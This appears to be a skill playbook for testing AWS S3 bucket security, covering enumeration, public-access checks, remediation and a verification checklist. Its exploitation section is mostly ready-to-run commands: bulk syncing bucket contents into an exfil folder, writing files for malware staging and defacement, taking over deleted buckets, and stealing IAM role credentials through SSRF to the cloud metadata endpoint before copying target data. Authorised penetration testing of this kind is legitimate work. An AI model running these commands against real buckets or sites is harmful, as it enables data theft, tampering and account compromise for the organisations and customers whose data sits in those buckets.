# AWS S3 Bucket Security Testing — Skill Playbook

**Mitre ATT&CK ID:** T1530 (Data from Cloud Storage), T1078.004 (Valid Accounts: Cloud Accounts), T1526 (Cloud Service Discovery), T1537 (Transfer Data to Cloud Account)
**OWASP Mapping:** A01:2021 – Broken Access Control, A05:2021 – Security Misconfiguration
**Severity:** Critical / High
**Last Updated:** 2026-08-02

---

## Metadata

```yaml
skill_id: aws-s3-security-v1
category: aws-iam
cloud_provider: aws
author: HiveBreach
mitre_attack_id:
  - T1530
  - T1078.004
  - T1526
  - T1537
owasp_mapping:
  - A01:2021-Broken Access Control
  - A05:2021-Security Misconfiguration
tags:
  - aws
  - s3
  - bucket-policy
  - public-access
  - bucket-takeover
  - cloud-security
tools:
  - aws-cli
  - pacu
  - prowler
  - s3audit
  - bucket-finder
verification_required: sandbox
```

---

## 1. Detection

### 1.1 Bucket Enumeration

```bash
aws s3api list-buckets --query 'Buckets[*].[Name,CreationDate]' --output table
for b in $(aws s3api list-buckets --query 'Buckets[*].Name' --output text); do
  echo "$b -> $(aws s3api get-bucket-location --bucket "$b" --query 'LocationConstraint' --output text)"
done

# Account-level and per-bucket Block Public Access
aws s3control get-public-access-block --account-id $(aws sts get-caller-identity --query Account --output text)
for b in $(aws s3api list-buckets --query 'Buckets[*].Name' --output text); do
  aws s3api get-public-access-block --bucket "$b" 2>/dev/null || echo "$b: NO BPA"
done
```

### 1.2 Public Bucket Detection (unauthenticated)

```bash
curl -s -o /dev/null -w "%{http_code}\n" "https://<bucket>.s3.amazonaws.com/"   # 200 = public
aws s3 ls s3://<bucket>/ --no-sign-request
python3 bucket_finder.py -l bucketnames.txt
```

### 1.3 IAM Policy vs ACL vs Bucket Policy

```bash
# Bucket policy (resource-based)
aws s3api get-bucket-policy --bucket <bucket> --output json

# ACL grants (legacy control)
aws s3api get-bucket-acl --bucket <bucket> --query 'Grants[?Grantee.URI==`http://acs.amazonaws.com/groups/global/AllUsers` || Grantee.URI==`http://acs.amazonaws.com/groups/global/AuthenticatedUsers`]' --output json

# Cross-account/public findings via IAM Access Analyzer
aws accessanalyzer list-findings \
  --analyzer-arn arn:aws:access-analyzer:<region>:<acct>:analyzer/<name> \
  --filter '{"resourceType": {"eq": ["AWS::S3::Bucket"]}}' --output json
```

---

## 2. Confirmation

### 2.1 Confirm Public Read / Write / List

```bash
aws s3 ls s3://<bucket>/ --no-sign-request
aws s3 cp s3://<bucket>/file.txt . --no-sign-request
echo "pwned" > /tmp/t.txt
aws s3 cp /tmp/t.txt s3://<bucket>/proof.txt --no-sign-request   # write test
curl -s -X PUT -d "pwned" "https://<bucket>.s3.amazonaws.com/proof2.txt"
aws s3api get-object-acl --bucket <bucket> --key file.txt --no-sign-request
```

### 2.2 Wildcard Principal Analysis

```bash
aws s3api get-bucket-policy --bucket <bucket> --output json | python3 -c "
import json,sys
d=json.load(sys.stdin)
for s in d.get('Statement',[]):
    p=s.get('Principal',{})
    if p=='*' or p=={'AWS':'*'}:
        print('PUBLIC:',s.get('Effect'),s.get('Action'),'Condition:',bool(s.get('Condition')))
"
```

### 2.3 Missing Versioning / Logging / Encryption

```bash
aws s3api get-bucket-versioning --bucket <bucket> --query 'Status'
aws s3api get-bucket-logging --bucket <bucket> --query 'LoggingEnabled'
aws s3api get-bucket-encryption --bucket <bucket> --query 'ServerSideEncryptionConfiguration' 2>/dev/null || echo "NO ENCRYPTION"
```

---

## 3. Exploitation

### 3.1 Data Exfiltration from Public Read Buckets

```bash
aws s3 sync s3://<bucket>/ ./exfil/ --no-sign-request
aws s3 ls s3://<bucket>/ --no-sign-request --recursive | grep -iE "\.env|backup|credential|secret|\.sql|\.json"

# Open write -> malware staging / defacement
curl -s -X POST "https://<bucket>.s3.amazonaws.com/" --data-binary @evil.txt \
  -H "Content-Type: text/plain" -H "x-amz-acl: public-read"
```

### 3.2 Bucket Policy Privilege Confirmation (with keys)

```bash
aws s3api list-objects-v2 --bucket <bucket> --query 'Contents[*].Key' --output text
aws s3 cp s3://<bucket>/sensitive.txt ./
aws s3api put-object --bucket <bucket> --key notes/backdoor.txt --body /tmp/t.txt
```

### 3.3 Deleted Bucket Takeover

```bash
# 1. Confirm bucket no longer exists
curl -s -o /dev/null -w "%{http_code}\n" "https://<deleted-bucket>.s3.amazonaws.com/"   # NoSuchBucket

# 2. Recreate in the same region (us-east-1 if LocationConstraint null)
aws s3api create-bucket --bucket <deleted-bucket> --region us-east-1

# 3. Confirm ownership and serve content
aws s3api put-object --bucket <deleted-bucket> --key index.html --body index.html --acl public-read
curl "https://<deleted-bucket>.s3.amazonaws.com/index.html"
```

### 3.4 SSRF to S3 Credential Theft

```bash
curl "https://target.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>"
export AWS_ACCESS_KEY_ID=... AWS_SECRET_ACCESS_KEY=... AWS_SESSION_TOKEN=...
aws s3 ls
aws s3 cp s3://target-bucket/data ./ --recursive
```

### 3.5 Pacu s3__enum Module

```bash
pacu
Pacu > set_keys
Pacu > run s3__enum
Pacu > run s3__download_bucket
```

---

## 4. Tool-Guidance

### 4.1 AWS CLI (primary)

```bash
aws s3 ls --no-sign-request
aws s3api get-bucket-policy --bucket <b>
aws s3api get-bucket-acl --bucket <b>
aws s3api get-public-access-block --bucket <b>
aws s3api get-bucket-versioning --bucket <b>
aws s3api get-bucket-encryption --bucket <b>
aws s3api list-objects-v2 --bucket <b>
```

### 4.2 Prowler (S3-specific checks)

```bash
prowler aws --checks s3_bucket_public_access s3_bucket_policy_public_write_access \
  s3_bucket_acl_prohibited s3_bucket_versioning_enabled -M csv -o ./out
```

### 4.3 Pacu / ScoutSuite

```bash
Pacu > run s3__enum
Pacu > run s3__download_bucket
scout aws --services s3 --report-dir ./scout-s3
```

---

## 5. PoC Generation

### PoC Template

```markdown
## S3 Bucket — [FINDING_ID]

**Bucket:** <bucket>.s3.amazonaws.com
**Vector:** Public read via bucket policy / ACL / no Block Public Access
**Type:** Public read / public write / takeover / SSRF-to-S3

### Proof
1. `aws s3 ls s3://<bucket>/ --no-sign-request` listed N objects
2. `aws s3 cp s3://<bucket>/file ./` retrieved without credentials
3. Policy: `{"Principal":"*","Action":"s3:GetObject","Resource":"arn:aws:s3:::<bucket>/*"}` no Condition
4. [Screenshot of anonymous download]

### Impact
- Sensitive data exposed (T1530)
- Write enabled: malware staging, web defacement, data tampering

### Remediation
- Enable S3 Block Public Access (account + bucket)
- Restrict bucket policy principals; add aws:SourceIp/aws:SourceVpce conditions
- Recreate buckets before deletion; audit S3 data events in CloudTrail
```

---

## 6. Verification

- [ ] Every public-access claim tested from a truly unauthenticated context (`--no-sign-request`, incognito)
- [ ] Takeover proven by creating the bucket and serving content in a sandbox account
- [ ] No real customer data copied outside sandbox (use dummy objects)
- [ ] Prowler + Pacu + manual checks cross-referenced
- [ ] CloudTrail data events confirmed which principal accessed the bucket
- [ ] Cleanup: delete PoC objects and recreated buckets, restore prior policy state

---

## 7. CheatSheet

```bash
curl -s -o /dev/null -w "%{http_code}\n" "https://<b>.s3.amazonaws.com/"   # 200=public
aws s3 ls s3://<b>/ --no-sign-request                                      # list
aws s3 cp s3://<b>/k . --no-sign-request                                   # read
echo x | aws s3 cp - s3://<b>/t.txt --no-sign-request                      # write
aws s3api get-bucket-policy --bucket <b> | jq .                            # policy
aws s3api get-bucket-acl --bucket <b>                                      # ACL
curl -s "https://<gone>.s3.amazonaws.com/"                                 # NoSuchBucket?
aws s3api create-bucket --bucket <gone>                                    # takeover
```

| Check | Command | Finding |
|---|---|---|
| Public list | `s3 ls --no-sign-request` | T1530 exposure |
| Public read | `s3 cp --no-sign-request` | T1530 exposure |
| Public write | `s3 cp` to bucket | Data tampering risk |
| Wildcard policy | `get-bucket-policy` | A01 misconfig |
| Missing versioning | `get-bucket-versioning` | Tamper/ransom risk |

---

## 8. Related Techniques (MITRE ATT&CK Mapping)

| Technique ID | Name | Relation |
|---|---|---|
| T1530 | Data from Cloud Storage | Read/exfiltrate bucket objects |
| T1078.004 | Valid Accounts: Cloud Accounts | Use stolen AWS keys against S3 |
| T1526 | Cloud Service Discovery | Bucket enumeration |
| T1537 | Transfer Data to Cloud Account | Staging data in attacker bucket |
| T1552.005 | Unsecured Credentials: Cloud Instance Metadata API | SSRF -> IAM role -> S3 |
| T1190 | Exploit Public-Facing Application | Entry point for SSRF-to-S3 |

---

## 9. References

- AWS S3 security docs: https://docs.aws.amazon.com/AmazonS3/latest/userguide/security.html
- HackTricks S3: https://book.hacktricks.xyz/pentesting-web/buckets
- Pacu S3 modules: https://github.com/RhinoSecurityLabs/pacu
- GrayHatWarfare: https://buckets.grayhatwarfare.com/
- bucket-finder: https://digi.ninja/projects/bucket_finder.php
- Prowler: https://github.com/prowler-cloud/prowler

---

*This playbook is for authorised security testing only. All verification must occur in AWS sandbox accounts.*
